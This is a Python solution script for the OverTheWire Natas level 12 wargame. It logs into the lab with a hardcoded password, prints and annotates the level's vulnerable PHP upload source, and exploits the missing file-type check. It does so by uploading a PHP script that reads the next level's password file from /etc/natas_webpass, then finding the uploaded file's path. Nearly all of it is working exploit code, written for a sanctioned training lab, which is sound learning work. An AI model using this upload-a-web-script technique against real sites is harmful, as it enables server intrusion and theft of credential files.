import requests
import bs4
import re
import html


# configuration for natas12
USERNAME = 'natas12'
PASSWORD = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
URL = 'http://natas12.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
source = html.unescape(response.text).replace('<br />', '')
# print(source)
"""
<? 

# here, the function generates a random string of length 10 using Mersenne Twister RNG
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

# here, we generate a random path using the dir parameter and the above function
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

# here, we get the extension info of our file and generate random path for our file
# reference: https://www.php.net/manual/en/function.pathinfo.php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    # create a random path: upload/randomstring.ext
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    # reference: https://www.php.net/manual/en/reserved.variables.files.php
    # array of items uploaded to the current script via the HTTP POST method
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?> 
"""


# since there is no validation on whether the file an image, we 
# can simply upload a php script to the server
php_script = """
<?
echo file_get_contents('/etc/natas_webpass/natas13'); 
?>
"""
data = {
    "MAX_FILE_SIZE" : "1000",
    "filename" : "script.php",
    "submit" : "submit"
}
files = {
    "uploadedfile" : bytearray(php_script, 'utf-8')
}
# to upload files as multipart/form-data, data param can contain the metadata, such as the filename
# while files can contain the actual byte file
# reference: https://stackoverflow.com/questions/22567306/python-requests-file-upload
# reference: https://stackoverflow.com/questions/24555949/difference-between-data-and-files-in-python-requests
response = session.post(URL + 'index.php', files=files, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the upload path name using regex
upload_dir = re.search(r'<a href="(upload/\w+.php)">', str(div_content)).group(1)
print(upload_dir)